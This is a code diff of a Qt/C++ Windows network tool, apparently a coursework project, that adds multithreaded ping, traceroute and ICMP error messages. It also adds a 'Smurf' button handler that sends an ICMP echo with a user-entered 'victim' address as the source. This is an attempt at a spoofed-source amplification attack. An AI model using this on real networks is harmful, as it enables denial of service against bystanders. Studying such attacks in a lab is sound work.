@@ -11,7 +11,6 @@ Widget::Widget(QWidget *parent) :
                               "5.255.255.5",
                               "192.168.0.1"
                           });
-    ui->cbInput->setEditable(true);
 }
 
 Widget::~Widget()
@@ -23,85 +22,89 @@ void Widget::on_pbPing_clicked()
 {
     QString strInput = ui->cbInput->currentText();
     QStringList listAddresses = strInput.split(';');
-    qDebug () << listAddresses;
+//    qDebug () << listAddresses;
     resultString.clear();
-//    QFuture<QString> future = QtConcurrent::mapped(listAddresses.begin(), listAddresses.end(), multithreadPing);
-//    future.waitForFinished();
-//    // qDebug () << future.results();
-//    foreach (auto item, future.results()) {
-//        ui->teOutput->append(item);
-//    }
-
-
-//    auto future = QtConcurrent::map(listAddresses.begin(), listAddresses.end(), multithreadPing);
-//    future.waitForFinished();
-//     ui->teOutput->append(resultString);
-
-
-//     qDebug () << resultString;
-
-     auto future = QtConcurrent::map(listAddresses.begin(), listAddresses.end(), [this](QString & ip_address) {
-             // Объявляем переменные
-             HANDLE hIcmpFile;                       // Обработчик
-             unsigned long ipaddr = INADDR_NONE;     // Адрес назначения
-             DWORD dwRetVal = 0;                     // Количество ответов
-             char SendData[32] = "Data Buffer";      // Буффер отсылаемых данных
-             LPVOID ReplyBuffer = NULL;              // Буффер ответов
-             DWORD ReplySize = 0;                    // Размер буффера ответов
-
-             // Устанавливаем IP-адрес из поля lineEdit
-             ipaddr = inet_addr(ip_address.toStdString().c_str());
-             hIcmpFile = IcmpCreateFile();   // Создаём обработчик
-
-             for(int i = 0; i < 3; i++){
-                 // Выделяем память под буффер ответов
-                 ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
-                 ReplyBuffer = (VOID*) malloc(ReplySize);
-
-                 // Вызываем функцию ICMP эхо запроса
-                 dwRetVal = IcmpSendEcho(hIcmpFile, ipaddr, SendData, sizeof(SendData),
-                             NULL, ReplyBuffer, ReplySize, 1000);
-
-                 // создаём строку, в которою запишем сообщения ответа
-                 QString strMessage = "";
-
-                 if (dwRetVal != 0) {
-                     // Структура эхо ответа
-                     PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)ReplyBuffer;
-                     struct in_addr ReplyAddr;
-                     ReplyAddr.S_un.S_addr = pEchoReply->Address;
-                     strMessage += "Received from ";
-                     strMessage += inet_ntoa( ReplyAddr );
-             //        strMessage += "\n";
-                     strMessage += " Status = " + pEchoReply->Status;
-                     strMessage += " Roundtrip time = " + QString::number(pEchoReply->RoundTripTime) + " milliseconds";
-                 } else {
-                     DWORD error = GetLastError();
-                     strMessage += "ICMP error " + QString::number(error) + ": ";
-                     strMessage += getErrorDescription(error);
-                 }
-
-                 // resultString.append(strMessage);
-                 mux.lock();
-                 ui->teOutput->append(strMessage);
-                 mux.unlock();
-
-                 free(ReplyBuffer); // Освобождаем память
-
-             }
-        });
-     future.waitForFinished();
-      // ui->teOutput->append(resultString);
+    auto future = QtConcurrent::map(listAddresses.begin(), listAddresses.end(), multithreadPing);
+    future.waitForFinished();
+    ui->teOutput->append(resultString);
+    threadCounter = 0;
 }
 
 void Widget::on_pbTraceroute_clicked()
 {
+    QString ip_address = ui->cbInput->currentText();
+    QStringList list_ip_addr = ip_address.split(';');
+    ip_address = list_ip_addr.first();
+    QString senderIp;
+    HANDLE hIcmpFile;                       // Обработчик
+    unsigned long ipaddr = INADDR_NONE;     // Адрес назначения
+    DWORD dwRetVal = 0;                     // Количество ответов
+    char SendData[32] = "Data Buffer";      // Буффер отсылаемых данных
+    LPVOID ReplyBuffer = NULL;              // Буффер ответов
+    DWORD ReplySize = 0;                    // Размер буффера ответов
+    IP_OPTION_INFORMATION ip_opt_info;
 
+    ZeroMemory(&ip_opt_info, sizeof (IP_OPTION_INFORMATION));
+    ui->teOutput->append("Traceroute to " + ip_address + " (30 hops max):");
+    ipaddr = inet_addr(ip_address.toStdString().c_str());
+    hIcmpFile = IcmpCreateFile();
+
+    for(uchar i = 1; i <= 30; i++){
+        ip_opt_info.Ttl = i;
+
+        ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
+        ReplyBuffer = (VOID*) malloc(ReplySize);
+
+        dwRetVal = IcmpSendEcho(hIcmpFile, ipaddr, SendData, sizeof(SendData),
+                    &ip_opt_info, ReplyBuffer, ReplySize, 2000);
+
+        QString strMessage = QString::number(i) + ". \t";
+
+        if (dwRetVal != 0) {
+            PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)ReplyBuffer;
+            struct in_addr ReplyAddr;
+            ReplyAddr.S_un.S_addr = pEchoReply->Address;
+            strMessage += QString::number(pEchoReply->RoundTripTime) + " ms \t";
+            senderIp = inet_ntoa( ReplyAddr );
+            strMessage += senderIp;
+        } else {
+            DWORD error = GetLastError();
+            strMessage += getErrorDescription(error);
+        }
+        ui->teOutput->append(strMessage);
+        free(ReplyBuffer); // Освобождаем память
+        if(senderIp == ip_address)
+            break;
+    }
+}
+
+void Widget::on_pbSmurf_clicked()
+{
+    QString dst_address = ui->cbInput->currentText();
+    QString victim_address = ui->cbVictimAddress->currentText();
+
+    HANDLE hIcmpFile;
+    unsigned long dst_ip_addr = INADDR_NONE;
+    unsigned long victim_ip_addr = INADDR_NONE;
+    DWORD dwRetVal = 0;
+    char SendData[32] = "Data Buffer";
+    LPVOID ReplyBuffer = NULL;
+    DWORD ReplySize = 0;
+
+    dst_ip_addr = inet_addr(dst_address.toStdString().c_str());
+    victim_ip_addr = inet_addr(victim_address.toStdString().c_str());
+    hIcmpFile = IcmpCreateFile();
+
+    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
+    ReplyBuffer = (VOID*) malloc(ReplySize);
+    dwRetVal = IcmpSendEcho2Ex(hIcmpFile, NULL, NULL, NULL, victim_ip_addr, dst_ip_addr,
+                               SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 1000);
+    free(ReplyBuffer);
 }
 
 void multithreadPing(QString ip_address)
 {
-    // Объявляем переменные
+    QString threadName = "T-" + QString::number(++threadCounter) + ": ";
     HANDLE hIcmpFile;                       // Обработчик
     unsigned long ipaddr = INADDR_NONE;     // Адрес назначения
     DWORD dwRetVal = 0;                     // Количество ответов
@@ -109,42 +112,33 @@ void multithreadPing(QString ip_address)
     LPVOID ReplyBuffer = NULL;              // Буффер ответов
     DWORD ReplySize = 0;                    // Размер буффера ответов
 
-    // Устанавливаем IP-адрес из поля lineEdit
     ipaddr = inet_addr(ip_address.toStdString().c_str());
-    hIcmpFile = IcmpCreateFile();   // Создаём обработчик
+    hIcmpFile = IcmpCreateFile();
 
-    for(int i = 0; i < 1; i++){
-        // Выделяем память под буффер ответов
+    for(int i = 0; i < 3; i++)
+    {
         ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
         ReplyBuffer = (VOID*) malloc(ReplySize);
-
-        // Вызываем функцию ICMP эхо запроса
         dwRetVal = IcmpSendEcho(hIcmpFile, ipaddr, SendData, sizeof(SendData),
-                    NULL, ReplyBuffer, ReplySize, 1000);
+                        NULL, ReplyBuffer, ReplySize, 1000);
 
-        // создаём строку, в которою запишем сообщения ответа
-        QString strMessage = "";
+        QString strMessage = threadName;
 
         if (dwRetVal != 0) {
-            // Структура эхо ответа
             PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)ReplyBuffer;
             struct in_addr ReplyAddr;
             ReplyAddr.S_un.S_addr = pEchoReply->Address;
-            strMessage += "Received from ";
+            strMessage += "Reply from ";
             strMessage += inet_ntoa( ReplyAddr );
-    //        strMessage += "\n";
-            strMessage += " Status = " + pEchoReply->Status;
-            strMessage += " Roundtrip time = " + QString::number(pEchoReply->RoundTripTime) + " milliseconds \n";
+//            strMessage += " Status = " + QString::number(pEchoReply->Status);
+            strMessage += "\tRTT = " + QString::number(pEchoReply->RoundTripTime) + " ms \n";
         } else {
             DWORD error = GetLastError();
-            strMessage += "ICMP error " + QString::number(error) + ": ";
+            strMessage += "\tICMP error " + QString::number(error) + ": ";
             strMessage += getErrorDescription(error) + "\n";
         }
-
         resultString.append(strMessage);
-
-        free(ReplyBuffer); // Освобождаем память
-
+        free(ReplyBuffer);
     }
 }
 
@@ -185,16 +179,22 @@ QString getErrorDescription(DWORD error ){
         s = "Bad route";
         break;
     case IP_TTL_EXPIRED_TRANSIT      :
+        s = "TTL expired transit";
         break;
     case IP_TTL_EXPIRED_REASSEM      :
+        s = "TTL expired reassem";
         break;
     case IP_PARAM_PROBLEM            :
+        s = "Param problem";
         break;
     case IP_SOURCE_QUENCH            :
+        s = "Source quench";
         break;
     case IP_OPTION_TOO_BIG           :
+        s = "Option too big";
         break;
     case IP_BAD_DESTINATION          :
+        s = "Bad destination";
         break;
     }
     return s;
